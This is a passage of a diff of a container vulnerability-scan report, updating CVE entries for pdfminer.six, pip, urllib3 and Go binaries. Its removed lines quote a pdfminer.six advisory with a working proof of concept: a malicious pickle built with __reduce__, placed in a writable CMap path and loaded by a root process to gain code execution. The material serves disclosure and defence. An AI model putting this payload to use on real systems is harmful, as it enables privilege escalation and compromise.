-│                       │     │                   - [🐍 Vulnerability
-│                       │     │                   Description](#-vulnerability-description)
-│                       │     │                   - [🎭 Demo Scenario](#-demo-scenario)
-│                       │     │                   - [🧨 Technical Details](#-technical-details)
-│                       │     │                   - [🔧 Setup and Usage](#-setup-and-usage)
-│                       │     │                   - [📝 Step-by-step Walkthrough](#-step-by-step-walkthrough)
-│                       │     │                   - [🛡️ Security Standards &
-│                       │     │                   References](#-security-standards--references)
-│                       │     │                   ---
-│                       │     │                   ## 🔍 Background
-│                       │     │                   **pdfminer.six** is a popular Python library for extracting
-│                       │     │                   text and information from PDF files. It supports CJK
-│                       │     │                   (Chinese, Japanese, Korean) fonts via external CMap files,
-│                       │     │                   which it loads from disk using Python's `pickle` module.
-│                       │     │                   > 🐍 **Security Issue:**
-│                       │     │                   > If the CMap search path (`CMAP_PATH` or default
-│                       │     │                   directories) includes a world-writable or user-writable
-│                       │     │                   directory, an attacker can place a malicious `.pickle.gz`
-│                       │     │                   file that will be loaded and deserialized by pdfminer.six,
-│                       │     │                   leading to arbitrary code execution.
-│                       │     │                   ### 🐍 Vulnerability Description
-│                       │     │                   - **Component:** pdfminer.six CMap loading
-│                       │     │                   (`pdfminer/cmapdb.py`)
-│                       │     │                   - **Issue:** Loads and deserializes `.pickle.gz` files using
-│                       │     │                   Python’s `pickle` module, which is unsafe for untrusted
-│                       │     │                   data.
-│                       │     │                   - **Exploitability:** If a low-privileged user can write to
-│                       │     │                   any directory in `CMAP_PATH`, they can execute code as the
-│                       │     │                   user running pdfminer—potentially root or a privileged
-│                       │     │                   service.
-│                       │     │                   - **Impact:** Full code execution as the service user,
-│                       │     │                   privilege escalation from user to root, persistence, and
-│                       │     │                   potential lateral movement.
-│                       │     │                   ### 🎭 Demo Scenario
-│                       │     │                   **Environment:**
-│                       │     │                   - 🐧 Alpine Linux (Docker container)
-│                       │     │                   - 👨‍💻 Two users:
-│                       │     │                     - `user1` (attacker: low-privilege)
-│                       │     │                     - `root` (victim: runs privileged PDF-processing script)
-│                       │     │                   - 🗂️ Shared writable directory: `/tmp/uploads`
-│                       │     │                   - 🛣️ `CMAP_PATH` set to `/tmp/uploads` for the privileged
-│                       │     │                   script
-│                       │     │                   - 📦 pdfminer.six installed system-wide
-│                       │     │                   **Attack Flow:**
-│                       │     │                   1. 🕵️‍♂️ `user1` creates a malicious CMap file
-│                       │     │                   (`Evil.pickle.gz`) in `/tmp/uploads`.
-│                       │     │                   2. 👑 The privileged service (`root`) processes a PDF or
-│                       │     │                   calls `get_cmap("Evil")`.
-│                       │     │                   3. 💣 The malicious pickle is deserialized, running arbitrary
-│                       │     │                    code as root.
-│                       │     │                   4. 🎯 The exploit creates a flag file in
-│                       │     │                   `/root/pwnedByPdfminer` as proof.
-│                       │     │                   ### 🧨 Technical Details
-│                       │     │                   - **Vulnerability Type:** Insecure deserialization of
-│                       │     │                   untrusted data using Python's `pickle`
-│                       │     │                   - **Attack Prerequisites:** Attacker can write to a directory
-│                       │     │                    included in `CMAP_PATH`
-│                       │     │                   - **Vulnerable Line:**
-│                       │     │                     ```python
-│                       │     │                     return type(str(name), (), pickle.loads(gzfile.read()))
-│                       │     │                     ```
-│                       │     │                     *In `pdfminer/cmapdb.py`'s `_load_data` method*
-│                       │     │                   -
-│                       │     │                   https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfmin
-│                       │     │                   er/cmapdb.py#L246
-│                       │     │                   - **Proof of Concept:** See `createEvilPickle.py`,
-│                       │     │                   `evilmod.py`, and `processPdf.py`
-│                       │     │                   **Exploit Chain:**
-│                       │     │                   - Attacker places a malicious `.pickle.gz` file in the CMap
-│                       │     │                   search path.
-│                       │     │                   - Privileged process (e.g., root) loads a CMap, triggering
-│                       │     │                   pickle deserialization.
-│                       │     │                   - Arbitrary code executes with the privilege of the process
-│                       │     │                   (root/service account).
-│                       │     │                   ## 🔧 Setup and Usage
-│                       │     │                   ### 📁 Files
-│                       │     │                   #### </> Dockerfile
-│                       │     │                   ```yml
-│                       │     │                   FROM python:3.11-alpine
-│                       │     │                   ARG PM_COMMIT=b808ee05dd7f0c8ea8ec34bdf394d40e63501086
-│                       │     │                   # Install git and build tooling
-│                       │     │                   RUN apk add --no-cache git build-base
-│                       │     │                   WORKDIR /opt
-│                       │     │                   # Clone pdfminer.six and check out the specific commit, then
-│                       │     │                   install from source
-│                       │     │                   RUN git clone https://github.com/pdfminer/pdfminer.six.git &&
-│                       │     │                    \
-│                       │     │                       cd pdfminer.six && \
-│                       │     │                       git fetch --all && \
-│                       │     │                       git checkout ${PM_COMMIT} && \
-│                       │     │                       pip install --no-cache-dir -e .
-│                       │     │                   # App working directory for PoC
-│                       │     │                   WORKDIR /app
-│                       │     │                   # Create low-privilege user and uploads dir
-│                       │     │                   RUN adduser -D user1 && \
-│                       │     │                       mkdir -p /tmp/uploads && \
-│                       │     │                       chown user1:user1 /tmp/uploads && \
-│                       │     │                       chmod 1777 /tmp/uploads
-│                       │     │                   # Copy PoC files
-│                       │     │                   COPY evilmod.py /app/evilmod.py
-│                       │     │                   COPY createEvilPickle.py /app/createEvilPickle.py
-│                       │     │                   COPY processPDF.py /app/processPDF.py
-│                       │     │                   ENV CMAP_PATH=/tmp/uploads
-│                       │     │                   ENV PYTHONUNBUFFERED=1
-│                       │     │                   # Keep the container running in background so you can exec
-│                       │     │                   into it anytime.
-│                       │     │                   CMD ["tail", "-f", "/dev/null"]
-│                       │     │                   ```
-│                       │     │                   #### </> evilmod.py
-│                       │     │                   ```python
-│                       │     │                   import os
-│                       │     │                   def evilFunc():
-│                       │     │                       with open("/root/pwnedByPdfminer", "w") as f:
-│                       │     │                           f.write("ROOTED by pdfminer pickle RCE\n")
-│                       │     │                       return {"CODE2CID": {}, "IS_VERTICAL": False}
-│                       │     │                   #### </> createEvilPickle.py
-│                       │     │                   import pickle
-│                       │     │                   import gzip
-│                       │     │                   from evilmod import evilFunc
-│                       │     │                   class Evil:
-│                       │     │                       def __reduce__(self):
-│                       │     │                           return (evilFunc, ())
-│                       │     │                   payload = pickle.dumps(Evil())
-│                       │     │                   with gzip.open("/tmp/uploads/Evil.pickle.gz", "wb") as f:
-│                       │     │                       f.write(payload)
-│                       │     │                   print("Malicious pickle created at
-│                       │     │                   /tmp/uploads/Evil.pickle.gz")
-│                       │     │                   #### </> processPDF.py
-│                       │     │                   from pdfminer.cmapdb import CMapDB
-│                       │     │                   os.environ["CMAP_PATH"] = "/tmp/uploads"
-│                       │     │                   CMapDB.get_cmap("Evil")
-│                       │     │                   print("CMap loaded. If vulnerable, /root/pwnedByPdfminer will
-│                       │     │                    be created.")
-│                       │     │                   ### 1️⃣ Build and start the demo container
-│                       │     │                   ```bash
-│                       │     │                   docker build -t pdfminer-priv-esc-demo .
-│                       │     │                   docker run --rm -it --name pdfminer-demo
-│                       │     │                   pdfminer-priv-esc-democ
-│                       │     │                   ### 2️⃣ In the container, open two shells in parallel (or
-│                       │     │                   switch users in one):
-│                       │     │                   #### 🕵️‍♂️ Shell 1 (Attacker: user1)
-│                       │     │                   su user1
-│                       │     │                   cd /app
-│                       │     │                   python createEvilPickle.py
-│                       │     │                   # ✅ Confirms: /tmp/uploads/Evil.pickle.gz is created and
-│                       │     │                   owned by user1
-│                       │     │                   #### 👑 Shell 2 (Victim: root)
-│                       │     │                   python processPdf.py
-│                       │     │                   # 🎯 Output: If vulnerable, /root/pwnedByPdfminer will be
-│                       │     │                   created
-│                       │     │                   ### 3️⃣ Proof of escalation
-│                       │     │                   cat /root/pwnedByPdfminer
-│                       │     │                   # 🏴 Output: ROOTED by pdfminer pickle RCE
-│                       │     │                   <img width="815" height="889" alt="proof-of-exploit"
-│                       │     │                   src="https://github.com/user-attachments/assets/f465d17c-a3af
-│                       │     │                   -49c5-9dbc-eec9635b36fc" />
-│                       │     │                   ## 📝 Step-by-step Walkthrough
-│                       │     │                   1. **user1** uses `createEvilPickle.py` to craft and place a
-│                       │     │                   malicious CMap pickle in a shared upload directory.
-│                       │     │                   2. The **root** user runs a typical PDF-processing script,
-│                       │     │                   which loads CMap files from that directory.
-│                       │     │                   3. The exploit triggers, running arbitrary code as root.
-│                       │     │                   4. The attacker now has proof of code execution as root (and,
-│                       │     │                    in a real attack, could escalate further).
-│                       │     │                   ## 🛡️ Security Standards & References
-│                       │     │                   - **CVSS (Common Vulnerability Scoring System):**
-│                       │     │                     - **Base Score:** 7.8 (High)
-│                       │     │                     - **Vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
-│                       │     │                   - **OWASP Top 10:**
-│                       │     │                     - [A08:2021 - Software and Data Integrity
-│                       │     │                   Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_
-│                       │     │                   Integrity_Failures/)
-│                       │     │                     - [A03:2021 -
-│                       │     │                   Injection](https://owasp.org/Top10/A03_2021-Injection/) (by
-│                       │     │                   analogy, as it's code injection via deserialization)
-│                       │     │                   - **MITRE CWE References:**
-│                       │     │                     - [CWE-502: Deserialization of Untrusted
-│                       │     │                   Data](https://cwe.mitre.org/data/definitions/502.html)
-│                       │     │                     - [CWE-915: Improperly Controlled Modification of
-│                       │     │                   Dynamically-Determined Object
-│                       │     │                   Attributes](https://cwe.mitre.org/data/definitions/915.html)
-│                       │     │                   - **MITRE ATT&CK Techniques:**
-│                       │     │                     - [T1055: Process
-│                       │     │                   Injection](https://attack.mitre.org/techniques/T1055/)
-│                       │     │                     - [T1548: Abuse Elevation Control
-│                       │     │                   Mechanism](https://attack.mitre.org/techniques/T1548/) 
+│                       │     ├ Fingerprint     : sha256:2687f9e2de5536addbf49240fcbff3d1e8e1bae18894d31ec5d918
+│                       │     │                   a1e16d190f 
+│                       │     ├ Title           : pdfminer.six before 20251230 contains an insecure
+│                       │     │                   deserialization vuln ... 
+│                       │     ├ Description     : pdfminer.six before 20251230 contains an insecure
+│                       │     │                   deserialization vulnerability in the CMap loading mechanism.
+│                       │     │                   The library uses Python pickle to deserialize CMap cache
+│                       │     │                   files without validation. An attacker with the ability to
+│                       │     │                   place a malicious pickle file in a location accessible to the
+│                       │     │                    application can trigger arbitrary code execution or
+│                       │     │                   privilege escalation when the file is loaded by a trusted
+│                       │     │                   process. This is caused by an incomplete patch to
+│                       │     │                   CVE-2025-64512. 
 │                       │     ├ Severity        : HIGH 
 │                       │     ├ VendorSeverity   ─ ghsa: 3 
 │                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
 │                       │     │                         ╰ V3Score : 7.8 
-│                       │     ├ References       ╭ [0]: https://github.com/pdfminer/pdfminer.six 
-│                       │     │                  ├ [1]: https://github.com/pdfminer/pdfminer.six/commit/b808ee0
+│                       │     ├ References       ╭ [0]: https://github.com/advisories/GHSA-f83h-ghpp-7wcc 
+│                       │     │                  ├ [1]: https://github.com/pdfminer/pdfminer.six 
+│                       │     │                  ├ [2]: https://github.com/pdfminer/pdfminer.six/commit/b808ee0
 │                       │     │                  │      5dd7f0c8ea8ec34bdf394d40e63501086 
-│                       │     │                  ╰ [2]: https://github.com/pdfminer/pdfminer.six/security/advis
-│                       │     │                         ories/GHSA-f83h-ghpp-7wcc 
-│                       │     ├ PublishedDate   : 2025-11-07T23:17:05Z 
-│                       │     ╰ LastModifiedDate: 2026-01-07T15:21:45Z 
+│                       │     │                  ├ [3]: https://github.com/pdfminer/pdfminer.six/security/advis
+│                       │     │                  │      ories/GHSA-f83h-ghpp-7wcc 
+│                       │     │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2025-70559 
+│                       │     ├ PublishedDate   : 2026-02-03T18:16:17.783Z 
+│                       │     ╰ LastModifiedDate: 2026-02-04T16:34:21.763Z 
 │                       ├ [2] ╭ VulnerabilityID : CVE-2025-8869 
 │                       │     ├ VendorIDs        ─ [0]: GHSA-4xh5-x5gv-qwph 
 │                       │     ├ PkgName         : pip 
@@ -25839,8 +25718,8 @@
 │                       │     │                          osystem%3Apip 
 │                       │     ├ Fingerprint     : sha256:18dfed90461566a83e235aa7339bd0d4719dd1b8329f822415a7b4
 │                       │     │                   9bf5642eac 
-│                       │     ├ Title           : When pip is installing and extracting a maliciously crafted
-│                       │     │                   wheel arch ... 
+│                       │     ├ Title           : pip: pip: Information disclosure via path traversal when
+│                       │     │                   installing crafted wheel archives 
 │                       │     ├ Description     : When pip is installing and extracting a maliciously crafted
 │                       │     │                   wheel archive, files may be extracted outside the
 │                       │     │                   installation directory. The path traversal is limited to
@@ -25848,18 +25727,24 @@
 │                       │     │                   inject or overwrite executable files in typical situations. 
 │                       │     ├ Severity        : LOW 
 │                       │     ├ CweIDs           ─ [0]: CWE-22 
-│                       │     ├ VendorSeverity   ─ ghsa: 1 
-│                       │     ├ References       ╭ [0]: https://github.com/pypa/pip 
-│                       │     │                  ├ [1]: https://github.com/pypa/pip/commit/8e227a9be4faa9594e05
+│                       │     ├ VendorSeverity   ╭ ghsa  : 1 
+│                       │     │                  ╰ redhat: 1 
+│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/
+│                       │     │                           │           A:N 
+│                       │     │                           ╰ V3Score : 3.9 
+│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-1703 
+│                       │     │                  ├ [1]: https://github.com/pypa/pip 
+│                       │     │                  ├ [2]: https://github.com/pypa/pip/commit/8e227a9be4faa9594e05
 │                       │     │                  │      d02ca05a413a2a4e7735 
-│                       │     │                  ├ [2]: https://github.com/pypa/pip/pull/13777 
-│                       │     │                  ├ [3]: https://mail.python.org/archives/list/security-announce
-│                       │     │                  │      @python.org/thread/WIEA34D4TABF2UNQJAOMXKCICSPBE2DJ 
+│                       │     │                  ├ [3]: https://github.com/pypa/pip/pull/13777 
 │                       │     │                  ├ [4]: https://mail.python.org/archives/list/security-announce
+│                       │     │                  │      @python.org/thread/WIEA34D4TABF2UNQJAOMXKCICSPBE2DJ 
+│                       │     │                  ├ [5]: https://mail.python.org/archives/list/security-announce
 │                       │     │                  │      @python.org/thread/WIEA34D4TABF2UNQJAOMXKCICSPBE2DJ/ 
-│                       │     │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-1703 
+│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-1703 
+│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-1703 
 │                       │     ├ PublishedDate   : 2026-02-02T15:16:30.51Z 
-│                       │     ╰ LastModifiedDate: 2026-02-02T15:16:30.51Z 
+│                       │     ╰ LastModifiedDate: 2026-02-03T16:44:36.63Z 
 │                       ├ [4] ╭ VulnerabilityID : CVE-2025-66418 
 │                       │     ├ VendorIDs        ─ [0]: GHSA-gm62-xv2j-4w53 
 │                       │     ├ PkgName         : urllib3 
@@ -29453,7 +29338,7 @@
 │                       │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-3900 
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-11065 
 │                       │      ├ PublishedDate   : 2026-01-26T20:16:06.84Z 
-│                       │      ╰ LastModifiedDate: 2026-01-27T14:59:34.073Z 
+│                       │      ╰ LastModifiedDate: 2026-02-03T20:15:56.087Z 
 │                       ├ [5]  ╭ VulnerabilityID : CVE-2025-8959 
 │                       │      ├ VendorIDs        ─ [0]: GHSA-wjrx-6529-hcj3 
 │                       │      ├ PkgID           : github.com/hashicorp/go-getter@v1.7.8 
@@ -30746,7 +30631,7 @@
 │                              │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2025-61730 
 │                              │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4340 
 │                              ├ PublishedDate   : 2026-01-28T20:16:09.94Z 
-│                              ╰ LastModifiedDate: 2026-02-02T18:16:12.647Z 
+│                              ╰ LastModifiedDate: 2026-02-03T20:36:41.3Z 
 ├ [4] ╭ Target         : usr/bin/syft 
 │     ├ Class          : lang-pkgs 
 │     ├ Type           : gobinary 
@@ -33724,7 +33609,7 @@
 │                       │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-3900 
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-11065 
 │                       │      ├ PublishedDate   : 2026-01-26T20:16:06.84Z 
-│                       │      ╰ LastModifiedDate: 2026-01-27T14:59:34.073Z 
+│                       │      ╰ LastModifiedDate: 2026-02-03T20:15:56.087Z 
 │                       ├ [4]  ╭ VulnerabilityID : CVE-2025-8959 
 │                       │      ├ VendorIDs        ─ [0]: GHSA-wjrx-6529-hcj3 
 │                       │      ├ PkgID           : github.com/hashicorp/go-getter@v1.7.8 
@@ -35017,7 +34902,7 @@
 │                              │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2025-61730 
 │                              │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4340 
 │                              ├ PublishedDate   : 2026-01-28T20:16:09.94Z 
-│                              ╰ LastModifiedDate: 2026-02-02T18:16:12.647Z 
+│                              ╰ LastModifiedDate: 2026-02-03T20:36:41.3Z 
 ├ [5] ╭ Target         : usr/bin/trivy 
 │     ├ Class          : lang-pkgs 
 │     ├ Type           : gobinary 
@@ -39781,7 +39666,7 @@
 │                       │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-3900 
 │                       │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-11065 
 │                       │      ├ PublishedDate   : 2026-01-26T20:16:06.84Z 
-│                       │      ╰ LastModifiedDate: 2026-01-27T14:59:34.073Z 
+│                       │      ╰ LastModifiedDate: 2026-02-03T20:15:56.087Z 
 │                       ├ [6]  ╭ VulnerabilityID : CVE-2025-8959 
 │                       │      ├ VendorIDs        ─ [0]: GHSA-wjrx-6529-hcj3 
 │                       │      ├ PkgID           : github.com/hashicorp/go-getter@v1.7.8 
@@ -41448,7 +41333,7 @@
 │                              │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2025-61730 
 │                              │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4340 
 │                              ├ PublishedDate   : 2026-01-28T20:16:09.94Z 
-│                              ╰ LastModifiedDate: 2026-02-02T18:16:12.647Z 
+│                              ╰ LastModifiedDate: 2026-02-03T20:36:41.3Z 
 ╰ [6] ╭ Target         : usr/bin/trivy_cve_query 
       ├ Class          : lang-pkgs 
       ├ Type           : gobinary 
@@ -42333,5 +42218,5 @@
                                │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2025-61730 
                                │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4340 
                                ├ PublishedDate   : 2026-01-28T20:16:09.94Z 
-                               ╰ LastModifiedDate: 2026-02-02T18:16:12.647Z 
+                               ╰ LastModifiedDate: 2026-02-03T20:36:41.3Z 
 ````
